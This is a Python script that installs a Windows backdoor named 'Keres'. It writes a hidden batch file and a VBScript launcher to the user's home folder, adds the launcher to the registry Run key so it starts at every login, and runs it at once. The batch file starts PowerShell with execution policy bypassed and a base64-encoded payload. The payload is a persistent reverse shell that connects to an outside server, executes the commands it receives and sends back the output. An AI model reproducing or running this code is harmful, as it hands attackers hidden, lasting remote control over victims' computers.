import subprocess

import os




# Get the home directory of the current user
home_directory = os.path.expanduser("~")

# Define the path for the batch file in the home directory
batch_file_path = os.path.join(home_directory, 'Keres.bat')

# Define the path for the VBScript file
vbs_script_path = os.path.join(home_directory, 'ExecKeres.vbs')

# Create the VBScript content with the dynamic batch file path
vbs_script_content = f'''
Set objShell = CreateObject("WScript.Shell")


batchFilePath = "{batch_file_path}"


objShell.Run batchFilePath, 0, True
'''






#""""""""""""""""""""""""""""""""""""""""""""""""""
ps_command = ''' CgBUAbgBjAHQAaQBvAG4AIABTAHQAYQByAHQALQBQAGUAcgBzAGkAcwB0AGUAbgB0AEMAbwBtAG0AYQBuAGQAIAB7AAoAIAAgACAAIABwAGEAcgBhAG0AIAAoAAoAIAAgACAAIAAgACAAIAAgAFsAcwB0AHIAaQBuAGcAXQAkAFUAbgBpAHEAdQBlAEkAZABlAG4AdABpAGYAaQBlAHIALAAKACAAIAAgACAAIAAgACAAIABbAHMAdAByAGkAbgBnAF0AJABTAGUAcgB2AGUAcgBBAGQAZAByAGUAcwBzACwACgAgACAAIAAgACAAIAAgACAAWwBpAG4AdABdACQAUABvAHIAdABOAHUAbQBiAGUAcgAKACAAIAAgACAAKQAKACAAIAAgACAAJAB1AG4AaQBxAHUAZQBJAGQAZQBuAHQAaQBmAGkAZQByACAAPQAgACQAVQBuAGkAcQB1AGUASQBkAGUAbgB0AGkAZgBpAGUAcgAKACQAbQBhAHgAUAByAG8AYwBlAHMAcwBlAHMAIAA9ACAAMwAKACQAcwBwAGEAdwBuAGUAZABQAHIAbwBjAGUAcwBzAGUAcwAgAD0AIAAwAAoACgB3AGgAaQBsAGUAIAAoACQAdAByAHUAZQApACAAewAKACAAIAAgACAAJABpAHMAUgB1AG4AbgBpAG4AZwAgAD0AIABHAGUAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAgACQAXwAuAEMAbwBtAG0AYQBuAGQATABpAG4AZQAgAC0AbABpAGsAZQAgACIAKgAkAHUAbgBpAHEAdQBlAEkAZABlAG4AdABpAGYAaQBlAHIAKgAiACAAfQAKAAoAIAAgACAAIABpAGYAIAAoAC0AbgBvAHQAIAAkAGkAcwBSAHUAbgBuAGkAbgBnACAALQBhAG4AZAAgACQAcwBwAGEAdwBuAGUAZABQAHIAbwBjAGUAcwBzAGUAcwAgAC0AbAB0ACAAJABtAGEAeABQAHIAbwBjAGUAcwBzAGUAcwApACAAewAKACAAIAAgACAAIAAgACAAIAAkAGMAbwBuAG4AZQBjAHQAaQBvAG4AVABlAHMAdAAgAD0AIABUAGUAcwB0AC0AQwBvAG4AbgBlAGMAdABpAG8AbgAgAC0AQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAIAAkAFMAZQByAHYAZQByAEEAZABkAHIAZQBzAHMAIAAtAEMAbwB1AG4AdAAgADEAIAAtAFEAdQBpAGUAdAAKAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABjAG8AbgBuAGUAYwB0AGkAbwBuAFQAZQBzAHQAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABQAFMASABPAE0ARQBcAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHUAbgBpAHEAdQBlAEkAZABlAG4AdABpAGYAaQBlAHIACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAYwBsAGkAZQBuAHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABjAHAAQwBsAGkAZQBuAHQACgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdAByAHkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAYwBsAGkAZQBuAHQALgBDAG8AbgBuAGUAYwB0ACgAJABTAGUAcgB2AGUAcgBBAGQAZAByAGUAcwBzACwAJABQAG8AcgB0AE4AdQBtAGIAZQByACAAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkACgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB3AGgAaQBsAGUAIAAoACQAdAByAHUAZQApACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGkAZgAgACgALQBuAG8AdAAgACQAYwBsAGkAZQBuAHQALgBDAG8AbgBuAGUAYwB0AGUAZAApACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAQwBvAG4AbgBlAGMAdABpAG8AbgAgAGwAbwBzAHQALgAgAFIAZQBjAG8AbgBuAGUAYwB0AGkAbgBnAC4ALgAuACIACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADYAMAAgACAAIwAgAFcAYQBpAHQAIABmAG8AcgAgADYAMAAgAHMAZQBjAG8AbgBkAHMAIABiAGUAZgBvAHIAZQAgAGEAdAB0AGUAbQBwAHQAaQBuAGcAIAB0AG8AIAByAGUAYwBvAG4AbgBlAGMAdAAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYgByAGUAYQBrAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQAKAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABiAHkAdABlAHMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAGIAeQB0AGUAWwBdACAANgA1ADUAMwA1AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQAKAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAGkAIAAtAGwAZQAgADAAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAEMAbwBuAG4AZQBjAHQAaQBvAG4AIAB0AG8AIABzAGUAcgB2AGUAcgAgAGMAbABvAHMAZQBkAC4AIABSAGUAYwBvAG4AbgBlAGMAdABpAG4AZwAuAC4ALgAiAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAFMAZQBjAG8AbgBkAHMAIAA2ADAAIAAgACMAIABXAGEAaQB0ACAAZgBvAHIAIAA2ADAAIABzAGUAYwBvAG4AZABzACAAYgBlAGYAbwByAGUAIABhAHQAdABlAG0AcAB0AGkAbgBnACAAdABvACAAcgBlAGMAbwBuAG4AZQBjAHQACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGIAcgBlAGEAawAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAZABhAHQAYQAgAD0AIABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGkAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgARwBlAHQALQBMAG8AYwBhAHQAaQBvAG4AKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcwBlAG4AZABiAHkAdABlACAAPQAgAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsACAAMAAsACAAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQAgAGMAYQB0AGMAaAAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIARQByAHIAbwByADoAIAAkAF8AIgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABzAHQAcgBlAGEAbQApACAAewAgACQAcwB0AHIAZQBhAG0ALgBDAGwAbwBzAGUAKAApACAAfQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABpAGYAIAAoACQAYwBsAGkAZQBuAHQAKQAgAHsAIAAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAgAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9ACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAKAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABzAHAAYQB3AG4AZQBkAFAAcgBvAGMAZQBzAHMAZQBzACsAKwAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgBOAG8AIABjAG8AbgBuAGUAYwB0AGkAbwBuACAAdABvACAAdABoAGUAIABzAGUAcgB2AGUAcgAuACAAUwBrAGkAcABwAGkAbgBnACAAcAByAG8AYwBlAHMAcwAgAHMAcABhAHcAbgAuACIACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAfQAgAGUAbABzAGUAaQBmACAAKAAkAHMAcABhAHcAbgBlAGQAUAByAG8AYwBlAHMAcwBlAHMAIAAtAGcAZQAgACQAbQBhAHgAUAByAG8AYwBlAHMAcwBlAHMAKQB7AAoAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAE0AYQB4AGkAbQB1AG0AIABuAHUAbQBiAGUAcgAgAG8AZgAgAHAAcgBvAGMAZQBzAHMAZQBzACAAcgBlAGEAYwBoAGUAZAAuACAAUwBrAGkAcABwAGkAbgBnACAAcAByAG8AYwBlAHMAcwAgAHMAcABhAHcAbgAuACIACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgBTAGMAcgBpAHAAdAAgAGkAcwAgAGEAbAByAGUAYQBkAHkAIAByAHUAbgBuAGkAbgBnAC4AIgAKACAAIAAgACAAfQAKAAoAIAAgACAAIAAjACAAQwBvAHUAbgB0ACAAcAByAG8AYwBlAHMAcwBlAHMAIABhAGYAdABlAHIAIABhACAANgAwAC0AcwBlAGMAbwBuAGQAIAB3AGEAaQB0AAoAIAAgACAAIABTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAFMAZQBjAG8AbgBkAHMAIAA2ADAACgAgACAAIAAgACQAcwBwAGEAdwBuAGUAZABQAHIAbwBjAGUAcwBzAGUAcwAgAD0AIAAoAEcAZQB0AC0AUAByAG8AYwBlAHMAcwAgAC0ATgBhAG0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIAB8ACAAVwBoAGUAcgBlAC0ATwBiAGoAZQBjAHQAIAB7ACAAJABfAC4AQwBvAG0AbQBhAG4AZABMAGkAbgBlACAALQBsAGkAawBlACAAIgAqACQAdQBuAGkAcQB1AGUASQBkAGUAbgB0AGkAZgBpAGUAcgAqACIAIAB9ACkALgBDAG8AdQBuAHQACgB9AAoAfQAKAFMAdABhAHIAdAAtAFAAZQByAHMAaQBzAHQAZQBuAHQAQwBvAG0AbQBhAG4AZAAgAC0AVQBuAGkAcQB1AGUASQBkAGUAbgB0AGkAZgBpAGUAcgAgACIASwBlAHIAZQBzACIAIAAtAFMAZQByAHYAZQByAEEAZABkAHIAZQBzAHMAIAAiAHIAZQB0AHUAcgBuAHMALQBnAG8AdgBlAHIAbgBpAG4AZwAuAGcAbAAuAGEAdAAuAHAAbAB5AC4AZwBnACIAIAAtAFAAbwByAHQATgB1AG0AYgBlAHIAIAAzADMAOQAyADUACgA='''
#stp



# """"""""""""""f'reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Merikh /t REG_SZ /d \\C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded_ps_command}',
# powershell_com =f'''New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Keres" -Value "{batch_file_path}"'''


command=f'''@echo off 
powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {ps_command}
'''

    

# """"""""""""""""""
try:
    #subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass","-EncodedCommand", encoded_ps_command], shell=True)
    #subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", powershell_com], shell=True)
    subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                       "/v", "Keres", "/t", "REG_SZ", "/d", f"{vbs_script_path}", "/f"], shell=True)
    with open(batch_file_path, 'w') as batch_file:
        batch_file.write(command)
    with open(vbs_script_path, 'w') as vbs_script:
        vbs_script.write(vbs_script_content)
    subprocess.run(['attrib', '+h', batch_file_path], shell=True)
    subprocess.run(['attrib', '+h', vbs_script_path], shell=True)
    print(f"VBScript file created at: {vbs_script_path}")
    # Execute the batch file
    subprocess.run(["wscript", vbs_script_path])
       
    print("PowerShell command executed successfully.")
except subprocess.CalledProcessError as e:
    print("Error executing PowerShell command:", e)